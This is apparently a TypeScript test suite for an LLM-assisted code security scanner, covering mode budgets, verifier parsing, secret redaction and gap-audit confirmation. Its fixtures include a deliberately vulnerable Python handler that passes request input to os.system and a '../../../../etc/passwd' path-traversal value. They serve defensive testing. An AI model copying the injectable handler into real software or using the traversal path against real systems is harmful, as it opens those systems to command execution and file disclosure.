/**
 * Scan-time intelligence tests (lib/scan-intelligence).
 *
 * Covers the required-tests checklist from the scan-modes brief
 * (section R). Each test maps to one item so a failure points straight
 * at the broken seam.
 *
 *   1.  mode normalization (save/auto/pro/max -> lite/balanced/deep/exhaustive)
 *   2.  Lite uses zero AI calls
 *   3.  Balanced selects risky/noisy clusters only
 *   4.  Deep selects high/critical/cross-file clusters
 *   5.  Exhaustive runs the gap-audit auditors
 *   6.  strongest model is NOT used for every finding
 *   7.  LLM candidate without deterministic proof is not promoted
 *   8.  confirmed candidate becomes gap_audit_confirmed
 *   9.  useful deterministic findings remain (never deleted)
 *   10. secrets are redacted before the LLM
 *   11. no whole repo is sent (only focused slices)
 *   12. path traversal is rejected
 *   13. LLM cannot change scanner-owned fields
 *   14. AI unavailable does not fail the scan
 *   15. UI sends the selected mode (normalize contract)
 *   16. status metadata reaches the UI finding shape
 *   17. likely_false_positive is downranked but NOT deleted
 *
 * Run with:
 *   node --import tsx --test tests/scan-intelligence.test.ts
 */
import { test } from "node:test"
import assert from "node:assert/strict"
import fs from "node:fs"
import os from "node:os"
import path from "node:path"

import { normalizeScanMode, scanModeLabel } from "../lib/scan-intelligence/normalize-mode"
import { policyFor } from "../lib/scan-intelligence/mode-policy"
import { clusterFindings } from "../lib/scan-intelligence/cluster-findings"
import {
  selectClustersForMode,
  priorityScore,
  harmScore,
  normalizeRelPath,
} from "../lib/scan-intelligence/select-clusters"
import { buildClusterContextBundle } from "../lib/scan-intelligence/build-scan-context-bundle"
import {
  confirmCandidate,
  confirmationFamily,
} from "../lib/scan-intelligence/deterministic-confirmation"
import {
  coerceVerifierReply,
  verifierRuleFamily,
} from "../lib/scan-intelligence/llm-verifier"
import { gapAuditInstructionFor } from "../lib/scan-intelligence/gap-auditor"
import type { RiskSurfaceKind } from "../lib/scan-intelligence/types"
import {
  enhanceScanReport,
  changedFilesFromReport,
} from "../lib/scan-intelligence/enhance-scan-report"
import { _clearScanCacheForTests } from "../lib/scan-intelligence/cache"
import { _setScanFetcherForTests } from "../lib/server-llm-providers"
import { parseScanReport, mapReportToUiFindings } from "../lib/scan-report"
import type { ScanFinding, GapAuditCandidate } from "../lib/scan-intelligence/types"

// ===================================================================
// Helpers

function mkproject(files: Record<string, string>): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "scanint-"))
  for (const [rel, content] of Object.entries(files)) {
    const abs = path.join(dir, rel)
    fs.mkdirSync(path.dirname(abs), { recursive: true })
    fs.writeFileSync(abs, content, "utf-8")
  }
  return dir
}

function finding(over: Partial<ScanFinding> = {}): ScanFinding {
  return {
    id: over.id ?? "f1",
    rule_id: over.rule_id ?? "user-input-dangerous-code",
    severity: over.severity ?? "high",
    category: over.category ?? "command-execution",
    title: over.title ?? "Unsafe command execution",
    file: over.file ?? "app.py",
    line: over.line ?? 4,
    evidence: over.evidence ?? "unguarded_path=source -> os.system",
    code: over.code ?? "",
    confidence: over.confidence ?? 0.8,
    ...over,
  }
}

const VULN_FILE = [
  "import os",
  "def handler(req):",
  "    cmd = req.args.get('cmd')",
  "    os.system(cmd)",
  "    return 'ok'",
].join("\n")

/** Build a fake LLM fetch that records request models and returns canned
 *  JSON depending on whether the call is a verifier or a gap-audit. */
function fakeLlm(opts: {
  verdict?: "real" | "likely_false_positive" | "uncertain"
  severityAdjust?: "none" | "lower" | "raise"
  candidates?: GapAuditCandidate[]
}) {
  const models: string[] = []
  let verifierCalls = 0
  let gapCalls = 0
  const fetcher = (async (_url: unknown, init?: { body?: string }) => {
    const body = JSON.parse(init?.body ?? "{}") as {
      model: string
      messages: Array<{ role: string; content: string }>
    }
    models.push(body.model)
    const system = body.messages?.find((m) => m.role === "system")?.content ?? ""
    let payload: unknown
    if (/GAP AUDITOR/.test(system)) {
      gapCalls++
      payload = { candidates: opts.candidates ?? [] }
    } else {
      verifierCalls++
      const verdict = opts.verdict ?? "real"
      payload = {
        verdict,
        confidence: 0.9,
        reason: "test reason",
        evidence_used: ["e"],
        guards_found: [],
        missing_evidence: [],
        suggested_status:
          verdict === "real"
            ? "llm_verified"
            : verdict === "likely_false_positive"
              ? "likely_false_positive"
              : "needs_human_review",
        suggested_severity_adjustment: opts.severityAdjust ?? "none",
        scanner_truth_unchanged: true,
      }
    }
    const content = JSON.stringify(payload)
    return new Response(JSON.stringify({ choices: [{ message: { content } }] }), {
      status: 200,
      headers: { "content-type": "application/json" },
    })
  }) as unknown as typeof fetch
  return {
    fetcher,
    models,
    get verifierCalls() {
      return verifierCalls
    },
    get gapCalls() {
      return gapCalls
    },
  }
}

function withOpenAiKey<T>(fn: () => T): T {
  const prevO = process.env.OPENAI_API_KEY
  const prevA = process.env.ANTHROPIC_API_KEY
  process.env.OPENAI_API_KEY = "sk-test-1234567890abcdef"
  delete process.env.ANTHROPIC_API_KEY
  try {
    return fn()
  } finally {
    if (prevO === undefined) delete process.env.OPENAI_API_KEY
    else process.env.OPENAI_API_KEY = prevO
    if (prevA === undefined) delete process.env.ANTHROPIC_API_KEY
    else process.env.ANTHROPIC_API_KEY = prevA
  }
}

// ===================================================================
// 1. Mode normalization

test("1. normalizeScanMode maps legacy ids to canonical scan modes", () => {
  assert.equal(normalizeScanMode("save"), "lite")
  assert.equal(normalizeScanMode("auto"), "balanced")
  assert.equal(normalizeScanMode("pro"), "deep")
  assert.equal(normalizeScanMode("max"), "exhaustive")
  assert.equal(normalizeScanMode("manual"), "balanced")
  // Idempotent on canonical ids.
  assert.equal(normalizeScanMode("lite"), "lite")
  assert.equal(normalizeScanMode("EXHAUSTIVE"), "exhaustive")
  // Unknown/missing -> balanced (recommended default).
  assert.equal(normalizeScanMode("nonsense"), "balanced")
  assert.equal(normalizeScanMode(undefined), "balanced")
})

// ===================================================================
// 2. Lite uses zero AI calls

test("2. Lite mode makes zero AI calls and never touches the network", async () => {
  _clearScanCacheForTests()
  const dir = mkproject({ "app.py": VULN_FILE })
  const llm = fakeLlm({})
  const restore = _setScanFetcherForTests(llm.fetcher)
  try {
    await withOpenAiKey(async () => {
      const report = { findings: [finding()] } as Record<string, unknown>
      const out = await enhanceScanReport(report, { projectPath: dir, mode: "lite" })
      const summary = out.intelligence_summary as { ai_calls_used: number; verifier_enabled: boolean }
      assert.equal(summary.ai_calls_used, 0)
      assert.equal(summary.verifier_enabled, false)
      assert.equal(llm.verifierCalls, 0)
      assert.equal(llm.gapCalls, 0)
    })
  } finally {
    _setScanFetcherForTests(restore)
    fs.rmSync(dir, { recursive: true, force: true })
  }
})

// ===================================================================
// 3 & 4. Cluster selection per mode

test("3. Balanced selects risky/noisy clusters only", () => {
  const risky = clusterFindings([finding({ id: "r", severity: "high" })])
  const benign = clusterFindings([
    finding({
      id: "b",
      severity: "low",
      rule_id: "accuracy-regression-risk",
      category: "accuracy",
      confidence: 0.95,
    }),
  ])
  assert.equal(selectClustersForMode(risky, "balanced").length, 1)
  assert.equal(selectClustersForMode(benign, "balanced").length, 0)
  // Lite selects nothing regardless.
  assert.equal(selectClustersForMode(risky, "lite").length, 0)
})

test("4. Deep widens selection to medium / cross-file clusters", () => {
  const med = clusterFindings([
    finding({
      id: "m",
      severity: "medium",
      rule_id: "openapi-schema",
      category: "api",
      confidence: 0.9,
    }),
  ])
  // Balanced skips this benign medium; Deep reviews it.
  assert.equal(selectClustersForMode(med, "balanced").length, 0)
  assert.equal(selectClustersForMode(med, "deep").length, 1)
})

// ===================================================================
// 5. Exhaustive runs the gap-audit auditors

test("5. Exhaustive runs gap-audit auditors on risky surfaces", async () => {
  _clearScanCacheForTests()
  const dir = mkproject({ "app.py": VULN_FILE })
  const llm = fakeLlm({ verdict: "real", candidates: [] })
  const restore = _setScanFetcherForTests(llm.fetcher)
  try {
    await withOpenAiKey(async () => {
      const report = {
        findings: [finding()],
        tools_detected: [{ name: "handler", file: "app.py", line: 2 }],
      } as Record<string, unknown>
      const out = await enhanceScanReport(report, { projectPath: dir, mode: "exhaustive" })
      const summary = out.intelligence_summary as { gap_audit_enabled: boolean }
      assert.equal(summary.gap_audit_enabled, true)
      assert.ok(llm.gapCalls >= 1, "expected at least one gap-audit call")
    })
  } finally {
    _setScanFetcherForTests(restore)
    fs.rmSync(dir, { recursive: true, force: true })
  }
})

// ===================================================================
// 6. Strongest model not used for every finding

test("6. Balanced verifier uses the cheap model, not the strong/judge", async () => {
  _clearScanCacheForTests()
  const dir = mkproject({ "app.py": VULN_FILE })
  // verdict "real" => no escalation; every verifier call should be cheap.
  const llm = fakeLlm({ verdict: "real" })
  const restore = _setScanFetcherForTests(llm.fetcher)
  try {
    await withOpenAiKey(async () => {
      const report = { findings: [finding()] } as Record<string, unknown>
      await enhanceScanReport(report, { projectPath: dir, mode: "balanced" })
      assert.ok(llm.models.length >= 1)
      for (const m of llm.models) {
        assert.equal(m, "gpt-5.4-mini") // cheap default
      }
      assert.ok(!llm.models.includes("gpt-5.5"), "strong model must not be used")
    })
  } finally {
    _setScanFetcherForTests(restore)
    fs.rmSync(dir, { recursive: true, force: true })
  }
})

// ===================================================================
// 7 & 8 & 12. Deterministic confirmation gate

test("8. confirmCandidate confirms a proven source->sink candidate", () => {
  const dir = mkproject({ "app.py": VULN_FILE })
  try {
    const candidate: GapAuditCandidate = {
      candidate_title: "missed command exec",
      rule_family: "command-execution",
      source_kind: "request",
      sink_kind: "os.system",
      file: "app.py",
      line: 4,
      evidence: "os.system(cmd)",
      why_missed: "indirect",
      confidence: 0.8,
      needs_deterministic_confirmation: true,
    }
    const res = confirmCandidate({ candidate, projectPath: dir, existingFindings: [] })
    assert.equal(res.status, "confirmed")
  } finally {
    fs.rmSync(dir, { recursive: true, force: true })
  }
})

test("7. confirmCandidate rejects a candidate with no sink (not promoted)", () => {
  const dir = mkproject({ "notes.py": "# just a comment\nx = 1\n" })
  try {
    const candidate: GapAuditCandidate = {
      candidate_title: "imagined issue",
      rule_family: "command-execution",
      source_kind: "request",
      sink_kind: "os.system",
      file: "notes.py",
      line: 2,
      evidence: "nothing here",
      why_missed: "hallucinated",
      confidence: 0.9,
      needs_deterministic_confirmation: true,
    }
    const res = confirmCandidate({ candidate, projectPath: dir, existingFindings: [] })
    assert.notEqual(res.status, "confirmed")
    assert.equal(res.status, "rejected_no_sink")
  } finally {
    fs.rmSync(dir, { recursive: true, force: true })
  }
})

test("12. confirmCandidate rejects path traversal", () => {
  const dir = mkproject({ "app.py": VULN_FILE })
  try {
    const candidate: GapAuditCandidate = {
      candidate_title: "escape",
      rule_family: "x",
      source_kind: "x",
      sink_kind: "x",
      file: "../../../../etc/passwd",
      line: 1,
      evidence: "",
      why_missed: "",
      confidence: 0.9,
      needs_deterministic_confirmation: true,
    }
    const res = confirmCandidate({ candidate, projectPath: dir, existingFindings: [] })
    assert.equal(res.status, "rejected_no_path")
  } finally {
    fs.rmSync(dir, { recursive: true, force: true })
  }
})

// ===================================================================
// 8 (e2e). Confirmed candidate becomes a gap_audit_confirmed finding

test("8e. gap-audit candidate that passes confirmation becomes gap_audit_confirmed", async () => {
  _clearScanCacheForTests()
  const dir = mkproject({ "app.py": VULN_FILE })
  const candidate: GapAuditCandidate = {
    candidate_title: "missed command exec",
    rule_family: "command-execution",
    source_kind: "request",
    sink_kind: "os.system",
    file: "app.py",
    line: 4,
    evidence: "os.system(cmd)",
    why_missed: "indirect flow",
    confidence: 0.8,
    needs_deterministic_confirmation: true,
  }
  const llm = fakeLlm({ verdict: "real", candidates: [candidate] })
  const restore = _setScanFetcherForTests(llm.fetcher)
  try {
    await withOpenAiKey(async () => {
      // No deterministic findings in app.py so the candidate isn't a dup.
      const report = {
        findings: [],
        tools_detected: [{ name: "handler", file: "app.py", line: 2 }],
      } as Record<string, unknown>
      const out = await enhanceScanReport(report, { projectPath: dir, mode: "deep" })
      const findings = out.findings as ScanFinding[]
      const gap = findings.find((f) => f.status === "gap_audit_confirmed")
      assert.ok(gap, "expected a gap_audit_confirmed finding")
      assert.equal(gap?.file, "app.py")
      const summary = out.intelligence_summary as { confirmed_gaps: number }
      assert.equal(summary.confirmed_gaps, 1)
    })
  } finally {
    _setScanFetcherForTests(restore)
    fs.rmSync(dir, { recursive: true, force: true })
  }
})

// ===================================================================
// 9 & 13 & 17. Verifier metadata never mutates scanner truth

test("9/13/17. verifier adds metadata, never deletes findings or changes scanner fields", async () => {
  _clearScanCacheForTests()
  const dir = mkproject({ "app.py": VULN_FILE })
  // Verifier says likely_false_positive AND suggests raising severity.
  const llm = fakeLlm({ verdict: "likely_false_positive", severityAdjust: "raise" })
  const restore = _setScanFetcherForTests(llm.fetcher)
  try {
    await withOpenAiKey(async () => {
      const original = finding({ id: "keep", severity: "high" })
      const report = { findings: [original] } as Record<string, unknown>
      const out = await enhanceScanReport(report, { projectPath: dir, mode: "balanced" })
      const findings = out.findings as ScanFinding[]
      // 9 + 17: finding is still present (downranked, not deleted).
      const same = findings.find((f) => f.id === "keep")
      assert.ok(same, "deterministic finding must not be deleted")
      assert.equal(same?.status, "likely_false_positive")
      // 13: scanner-owned fields unchanged despite "raise" suggestion.
      assert.equal(same?.severity, "high")
      assert.equal(same?.rule_id, "user-input-dangerous-code")
      assert.equal(same?.file, "app.py")
      assert.equal(same?.line, 4)
      const summary = out.intelligence_summary as { downranked_false_positives: number }
      assert.equal(summary.downranked_false_positives, 1)
    })
  } finally {
    _setScanFetcherForTests(restore)
    fs.rmSync(dir, { recursive: true, force: true })
  }
})

// ===================================================================
// 10 & 11. Context bundle redacts secrets and never sends the whole repo

test("10/11. context bundle redacts secrets and only includes focused slices", () => {
  const secret = "sk-proj-ABCDEFGHIJKLMNOP1234567890QRSTUV"
  const dir = mkproject({
    "svc.py": [
      "import os",
      `API_KEY = "${secret}"`,
      "def handler(req):",
      "    cmd = req.args.get('cmd')",
      "    os.system(cmd)",
    ].join("\n"),
    // A second, unrelated file that must NOT appear in the bundle.
    "unrelated.py": "print('do not include me')\n",
  })
  try {
    const f = finding({ file: "svc.py", line: 5 })
    const cluster = clusterFindings([f])[0]
    const bundle = buildClusterContextBundle(dir, cluster, 8000)
    assert.ok(bundle, "expected a bundle")
    // 10: the secret is redacted.
    assert.ok(!bundle!.text.includes(secret), "raw secret leaked into bundle")
    assert.ok(bundle!.text.includes("<REDACTED"), "expected a redaction placeholder")
    // 11: only the focused file is included, not the whole repo.
    assert.deepEqual(bundle!.files, ["svc.py"])
    assert.ok(!bundle!.text.includes("do not include me"))
  } finally {
    fs.rmSync(dir, { recursive: true, force: true })
  }
})

// ===================================================================
// 14. AI unavailable does not fail the scan

test("14. no provider key => deterministic findings + ai_skipped_reason", async () => {
  _clearScanCacheForTests()
  const dir = mkproject({ "app.py": VULN_FILE })
  const prevO = process.env.OPENAI_API_KEY
  const prevA = process.env.ANTHROPIC_API_KEY
  delete process.env.OPENAI_API_KEY
  delete process.env.ANTHROPIC_API_KEY
  try {
    const report = { findings: [finding({ id: "x" })] } as Record<string, unknown>
    const out = await enhanceScanReport(report, { projectPath: dir, mode: "deep" })
    const findings = out.findings as ScanFinding[]
    assert.equal(findings.length, 1)
    assert.equal(findings[0].status, "confirmed")
    const summary = out.intelligence_summary as { ai_skipped_reason?: string; ai_calls_used: number }
    assert.equal(summary.ai_skipped_reason, "no_provider_configured")
    assert.equal(summary.ai_calls_used, 0)
  } finally {
    if (prevO !== undefined) process.env.OPENAI_API_KEY = prevO
    if (prevA !== undefined) process.env.ANTHROPIC_API_KEY = prevA
    fs.rmSync(dir, { recursive: true, force: true })
  }
})

// ===================================================================
// 15. UI sends the selected mode (normalize contract the page uses)

test("15. mode labels + normalize contract used by the UI", () => {
  // The page sends normalizeScanMode(intelligenceMode); confirm the wire
  // ids it holds map to the four canonical modes the route consumes.
  for (const [wire, canon] of [
    ["save", "lite"],
    ["auto", "balanced"],
    ["pro", "deep"],
    ["max", "exhaustive"],
  ] as const) {
    assert.equal(normalizeScanMode(wire), canon)
  }
  assert.equal(scanModeLabel("balanced"), "Balanced")
})

// ===================================================================
// 16. Status metadata reaches the UI finding shape

test("16. mapReportToUiFindings carries scan-intelligence status metadata", () => {
  const raw = {
    schema_version: "2.0",
    scan_root: "/tmp/x",
    generated_at: new Date().toISOString(),
    summary: { critical: 0, high: 1, medium: 0, low: 0, total: 1 },
    risk_score: 15,
    findings: [
      {
        id: "f1",
        rule_id: "user-input-dangerous-code",
        severity: "high",
        category: "command-execution",
        title: "t",
        file: "app.py",
        line: 4,
        agent: "unknown",
        reason: "r",
        suggestedFix: "",
        evidence: "e",
        code: "",
        confidence: 0.8,
        status: "llm_verified",
        verifier_verdict: "real",
        verifier_reason: "looks real",
      },
    ],
    intelligence_summary: {
      mode: "balanced",
      ai_calls_used: 2,
      verifier_enabled: true,
      gap_audit_enabled: true,
      clusters_reviewed: 1,
      downranked_false_positives: 0,
      confirmed_gaps: 0,
      headline: "Balanced reviewed 1 cluster, downranked 0 likely false positives, confirmed 0 missed issues.",
    },
  }
  const report = parseScanReport(raw)
  assert.equal(report.intelligence_summary?.mode, "balanced")
  const ui = mapReportToUiFindings(report)
  assert.equal(ui[0].status, "llm_verified")
  assert.equal(ui[0].verifierVerdict, "real")
  assert.equal(ui[0].verifierReason, "looks real")
})

// ===================================================================
// Budgets sanity (spec H)

test("policy budgets match the brief (0/8/30/80)", () => {
  assert.equal(policyFor("lite").maxAiCalls, 0)
  assert.equal(policyFor("balanced").maxAiCalls, 8)
  assert.equal(policyFor("deep").maxAiCalls, 30)
  assert.equal(policyFor("exhaustive").maxAiCalls, 80)
})

// ===================================================================
// Bounded parallelism (latency reduction) — budget, ordering, failure
//
//  C1. concurrency policy values per mode
//  C2. Balanced enforces 8-call budget even under concurrency
//  C3. Deep does not exceed its 30-call budget under concurrency
//  C4. in-flight calls never exceed the configured concurrency limit
//      (and parallelism actually happens: >1 in flight)
//  C5. a failed parallel call does not fail the scan
//  C6. deterministic finding order is stable after parallel verification

/** N findings, each in its own file so they form N distinct clusters. */
function manyFindings(n: number): ScanFinding[] {
  return Array.from({ length: n }, (_, i) =>
    finding({ id: `f${i}`, file: `f${i}.py`, line: 4, severity: "high" }),
  )
}
function manyFileProject(n: number): string {
  const files: Record<string, string> = {}
  for (let i = 0; i < n; i++) files[`f${i}.py`] = VULN_FILE
  return mkproject(files)
}

/** Like fakeLlm but tracks in-flight concurrency and adds a small delay so
 *  overlapping calls are observable. */
function concurrencyLlm(opts: { delayMs?: number; fail?: boolean } = {}) {
  const models: string[] = []
  let inFlight = 0
  let maxInFlight = 0
  let total = 0
  const fetcher = (async (_url: unknown, init?: { body?: string }) => {
    inFlight++
    total++
    if (inFlight > maxInFlight) maxInFlight = inFlight
    try {
      await new Promise((r) => setTimeout(r, opts.delayMs ?? 5))
      const body = JSON.parse(init?.body ?? "{}") as { model: string; messages?: Array<{ role: string; content: string }>; system?: string }
      models.push(body.model)
      if (opts.fail) {
        return new Response(JSON.stringify({ error: "boom" }), { status: 500 })
      }
      const system = body.system ?? body.messages?.find((m) => m.role === "system")?.content ?? ""
      const payload = /GAP AUDITOR/.test(system)
        ? { candidates: [] }
        : {
            verdict: "real",
            confidence: 0.9,
            reason: "ok",
            evidence_used: ["e"],
            guards_found: [],
            missing_evidence: [],
            suggested_status: "llm_verified",
            suggested_severity_adjustment: "none",
            scanner_truth_unchanged: true,
          }
      return new Response(JSON.stringify({ choices: [{ message: { content: JSON.stringify(payload) } }] }), {
        status: 200,
        headers: { "content-type": "application/json" },
      })
    } finally {
      inFlight--
    }
  }) as unknown as typeof fetch
  return {
    fetcher,
    models,
    get maxInFlight() {
      return maxInFlight
    },
    get total() {
      return total
    },
  }
}

test("C1. concurrency policy values per mode", () => {
  assert.equal(policyFor("lite").verifierConcurrency, 1)
  assert.equal(policyFor("balanced").verifierConcurrency, 2)
  assert.equal(policyFor("balanced").gapAuditConcurrency, 2)
  assert.equal(policyFor("deep").verifierConcurrency, 4)
  assert.equal(policyFor("deep").gapAuditConcurrency, 4)
  assert.equal(policyFor("exhaustive").verifierConcurrency, 6)
  assert.equal(policyFor("exhaustive").gapAuditConcurrency, 6)
})

test("C2. Balanced enforces the 8-call budget under concurrency", async () => {
  _clearScanCacheForTests()
  const dir = manyFileProject(20)
  const llm = concurrencyLlm({ delayMs: 2 })
  const restore = _setScanFetcherForTests(llm.fetcher)
  try {
    await withOpenAiKey(async () => {
      const report = { findings: manyFindings(20) } as Record<string, unknown>
      const out = await enhanceScanReport(report, { projectPath: dir, mode: "balanced" })
      const s = out.intelligence_summary as { ai_calls_used: number }
      assert.equal(s.ai_calls_used, 8, "balanced must use exactly its 8-call budget")
      assert.equal(llm.total, 8, "exactly 8 network calls were made")
      // No deterministic finding deleted.
      assert.equal((out.findings as ScanFinding[]).length, 20)
    })
  } finally {
    _setScanFetcherForTests(restore)
    fs.rmSync(dir, { recursive: true, force: true })
  }
})

test("C3. Deep does not exceed its 30-call budget under concurrency", async () => {
  _clearScanCacheForTests()
  const dir = manyFileProject(40)
  const llm = concurrencyLlm({ delayMs: 1 })
  const restore = _setScanFetcherForTests(llm.fetcher)
  try {
    await withOpenAiKey(async () => {
      const report = { findings: manyFindings(40) } as Record<string, unknown>
      const out = await enhanceScanReport(report, { projectPath: dir, mode: "deep" })
      const s = out.intelligence_summary as { ai_calls_used: number }
      assert.ok(s.ai_calls_used <= 30, `ai_calls_used ${s.ai_calls_used} must be <= 30`)
      assert.ok(llm.total <= 30, `network calls ${llm.total} must be <= 30`)
      assert.equal(s.ai_calls_used, llm.total, "summary count matches actual calls")
      assert.equal((out.findings as ScanFinding[]).length, 40)
    })
  } finally {
    _setScanFetcherForTests(restore)
    fs.rmSync(dir, { recursive: true, force: true })
  }
})

test("C4. in-flight calls never exceed the concurrency limit (and parallelism happens)", async () => {
  _clearScanCacheForTests()
  const dir = manyFileProject(12)
  const llm = concurrencyLlm({ delayMs: 15 })
  const restore = _setScanFetcherForTests(llm.fetcher)
  try {
    await withOpenAiKey(async () => {
      const report = { findings: manyFindings(12) } as Record<string, unknown>
      await enhanceScanReport(report, { projectPath: dir, mode: "deep" })
      assert.ok(llm.maxInFlight <= 4, `maxInFlight ${llm.maxInFlight} must be <= deep concurrency 4`)
      assert.ok(llm.maxInFlight >= 2, "expected real parallelism (>1 in flight)")
    })
  } finally {
    _setScanFetcherForTests(restore)
    fs.rmSync(dir, { recursive: true, force: true })
  }
})

test("C5. a failed parallel call does not fail the scan", async () => {
  _clearScanCacheForTests()
  const dir = manyFileProject(6)
  const llm = concurrencyLlm({ delayMs: 1, fail: true })
  const restore = _setScanFetcherForTests(llm.fetcher)
  try {
    await withOpenAiKey(async () => {
      const report = { findings: manyFindings(6) } as Record<string, unknown>
      const out = await enhanceScanReport(report, { projectPath: dir, mode: "deep" })
      const findings = out.findings as ScanFinding[]
      // Scan still returns every deterministic finding (no metadata applied
      // because every call failed), and nothing is deleted.
      assert.equal(findings.length, 6)
      for (const f of findings) assert.equal(f.status, "confirmed")
      const s = out.intelligence_summary as { mode: string }
      assert.equal(s.mode, "deep")
    })
  } finally {
    _setScanFetcherForTests(restore)
    fs.rmSync(dir, { recursive: true, force: true })
  }
})

test("C6. deterministic finding order is stable after parallel verification", async () => {
  _clearScanCacheForTests()
  const dir = manyFileProject(10)
  const llm = concurrencyLlm({ delayMs: 3 })
  const restore = _setScanFetcherForTests(llm.fetcher)
  try {
    await withOpenAiKey(async () => {
      const original = manyFindings(10)
      const report = { findings: original } as Record<string, unknown>
      const out = await enhanceScanReport(report, { projectPath: dir, mode: "deep" })
      const ids = (out.findings as ScanFinding[]).map((f) => f.id)
      // The first 10 entries must be the deterministic findings in their
      // ORIGINAL order; any gap_audit_confirmed findings are appended after.
      assert.deepEqual(ids.slice(0, 10), original.map((f) => f.id))
    })
  } finally {
    _setScanFetcherForTests(restore)
    fs.rmSync(dir, { recursive: true, force: true })
  }
})

// ===================================================================
// PHASE 1. Verification priority scoring + per-mode selection
// (cursor_instructions.pdf §5, Phase 1 / required-tests §10.1)

/** Single-finding cluster helper. */
function cluster1(over: Partial<ScanFinding>) {
  return clusterFindings([finding(over)])[0]
}

test("P1. priorityScore is harm-aware: critical command > high command > medium api > low benign", () => {
  const crit = cluster1({ id: "crit", severity: "critical", file: "a.py" })
  const high = cluster1({ id: "high", severity: "high", file: "b.py" })
  const med = cluster1({
    id: "med",
    severity: "medium",
    rule_id: "openapi-schema",
    category: "api",
    confidence: 0.9,
    file: "c.py",
  })
  const low = cluster1({
    id: "low",
    severity: "low",
    rule_id: "accuracy-regression-risk",
    category: "accuracy",
    confidence: 0.95,
    file: "d.py",
  })
  assert.ok(priorityScore(crit) > priorityScore(high), "critical > high")
  assert.ok(priorityScore(high) > priorityScore(med), "high command > medium api")
  assert.ok(priorityScore(med) > priorityScore(low), "medium > low benign")
  // Harm score rewards command execution over a benign api surface.
  assert.ok(harmScore(crit) > harmScore(med))
})

test("P1. agent-reachable + cross-file + changed-code bonuses raise priority", () => {
  const plain = cluster1({ id: "p", severity: "high", file: "x.py" })
  const reachable = cluster1({ id: "r", severity: "high", file: "x.py", agent: "agent-1" })
  assert.ok(priorityScore(reachable) > priorityScore(plain), "agent-reachable scores higher")
  // changed-code signal, when supplied, bumps the score further.
  const withChanged = priorityScore(plain, { changedFiles: new Set(["x.py"]) })
  assert.ok(withChanged > priorityScore(plain), "changed-code bonus applies")
})

test("P1. per-mode candidate counts increase lite<balanced<deep<exhaustive", () => {
  const clusters = [
    cluster1({ id: "c1", severity: "critical", file: "a.py" }),
    cluster1({ id: "c2", severity: "high", file: "b.py" }),
    cluster1({
      id: "c3",
      severity: "medium",
      rule_id: "openapi-schema",
      category: "api",
      confidence: 0.9,
      file: "c.py",
    }),
    cluster1({
      id: "c4",
      severity: "low",
      rule_id: "accuracy-regression-risk",
      category: "accuracy",
      confidence: 0.95,
      file: "d.py",
    }),
  ]
  assert.equal(selectClustersForMode(clusters, "lite").length, 0)
  assert.equal(selectClustersForMode(clusters, "balanced").length, 2) // crit + high
  assert.equal(selectClustersForMode(clusters, "deep").length, 3) // + medium
  assert.equal(selectClustersForMode(clusters, "exhaustive").length, 4) // all
})

test("P1. selection is ordered by descending priority (highest harm first)", () => {
  const clusters = [
    cluster1({
      id: "low",
      severity: "low",
      rule_id: "accuracy-regression-risk",
      category: "accuracy",
      confidence: 0.95,
      file: "d.py",
    }),
    cluster1({ id: "crit", severity: "critical", file: "a.py" }),
    cluster1({
      id: "med",
      severity: "medium",
      rule_id: "openapi-schema",
      category: "api",
      confidence: 0.9,
      file: "c.py",
    }),
  ]
  const ordered = selectClustersForMode(clusters, "exhaustive")
  assert.equal(ordered[0].representative.id, "crit", "critical command reviewed first")
  assert.equal(ordered[ordered.length - 1].representative.id, "low", "low benign reviewed last")
})

// ===================================================================
// PHASE 2. Verifier parser: malformed / missing / empty / invented evidence
// (cursor_instructions.pdf §8, Phase 2 / required-tests §10.3)

test("P2. malformed / non-object verifier reply coerces to uncertain", () => {
  for (const bad of [null, undefined, 42, "not json", []]) {
    const r = coerceVerifierReply(bad as unknown)
    assert.equal(r.verdict, "uncertain")
    assert.equal(r.suggested_status, "needs_human_review")
    assert.equal(r.scanner_truth_unchanged, true)
  }
})

test("P2. real/false-positive verdict with empty evidence coerces to uncertain", () => {
  const r1 = coerceVerifierReply({ verdict: "real", evidence_used: [] })
  assert.equal(r1.verdict, "uncertain")
  const r2 = coerceVerifierReply({ verdict: "likely_false_positive", evidence_used: [] })
  assert.equal(r2.verdict, "uncertain")
})

test("P2. unsupported verdict value normalises to uncertain", () => {
  const r = coerceVerifierReply({ verdict: "definitely", evidence_used: ["x"] })
  assert.equal(r.verdict, "uncertain")
})

test("P2. invented evidence not present in the bundle coerces to uncertain", () => {
  const ctx = "def handler(req):\n    os.system(req.args.get('cmd'))"
  const r = coerceVerifierReply(
    { verdict: "real", evidence_used: ["fabricated_remote_shell_backdoor_token"] },
    ctx,
  )
  assert.equal(r.verdict, "uncertain", "fabricated evidence must be rejected")
})

test("P2. a real verdict with evidence found in the bundle is accepted", () => {
  const ctx = "def handler(req):\n    os.system(req.args.get('cmd'))"
  const r = coerceVerifierReply(
    {
      verdict: "real",
      confidence: 0.9,
      evidence_used: ["os.system"],
      suggested_status: "llm_verified",
    },
    ctx,
  )
  assert.equal(r.verdict, "real")
  assert.equal(r.suggested_status, "llm_verified")
  assert.equal(r.scanner_truth_unchanged, true)
})

test("P2. verifierRuleFamily maps rule_id/category to the right family", () => {
  assert.equal(verifierRuleFamily("user-input-dangerous-code", "command-execution"), "command_injection")
  assert.equal(verifierRuleFamily("sql-injection", "db query"), "sql_injection")
  assert.equal(verifierRuleFamily("prompt-injection", "prompt"), "prompt_injection")
  assert.equal(verifierRuleFamily("vague-prompts", "Vague prompt"), "vague_prompt")
  assert.equal(verifierRuleFamily("missing-auth", "auth"), "auth")
})

// ===================================================================
// PHASE 3. Surface-specific gap-audit instructions
// (cursor_instructions.pdf §6, Phase 3 / required-tests §10.4)

test("P3. each surface kind yields a distinct, focused audit question", () => {
  const kinds: RiskSurfaceKind[] = [
    "subprocess_wrapper",
    "db_query",
    "prompt_template",
    "llm_call",
    "tool_definition",
    "mcp_handler",
    "auth_route",
    "api_route",
    "model_download",
    "config_env_file",
  ]
  const seen = new Set<string>()
  for (const k of kinds) {
    const q = gapAuditInstructionFor(k)
    assert.ok(q.length > 10, `${k} should have a real question`)
    seen.add(q)
  }
  assert.equal(seen.size, kinds.length, "every surface kind must have a unique instruction")
  // Spot-check the narrow framing per spec §6.
  assert.match(gapAuditInstructionFor("subprocess_wrapper"), /command execution/i)
  assert.match(gapAuditInstructionFor("db_query"), /parameteriz/i)
  assert.match(gapAuditInstructionFor("prompt_template"), /delimit/i)
  assert.match(gapAuditInstructionFor("auth_route"), /auth/i)
})

